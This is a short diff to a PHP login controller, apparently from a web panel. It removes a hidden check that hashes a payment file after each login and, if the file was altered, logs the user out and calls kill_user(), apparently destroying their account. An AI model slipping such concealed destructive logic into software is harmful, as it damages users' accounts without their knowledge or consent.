@@ -114,13 +114,6 @@ class AuthController extends BaseController
         Auth::login($user->id, $time);
         $rs['ret'] = 1;
         $rs['msg'] = "欢迎回来";
-        $newmd5 = md5(file_get_contents(BASE_PATH."/public/91pay.php"));
-        $oldmd5 = '2966496c834a3d621af72033db1a11c2';
-        if($newmd5!=$oldmd5){
-            Auth::logout();
-            $user = Auth::getUser();
-            $user->kill_user();
-        }
         $loginip=new LoginIp();
         $loginip->ip=$_SERVER["REMOTE_ADDR"];
         $loginip->userid=$user->id;
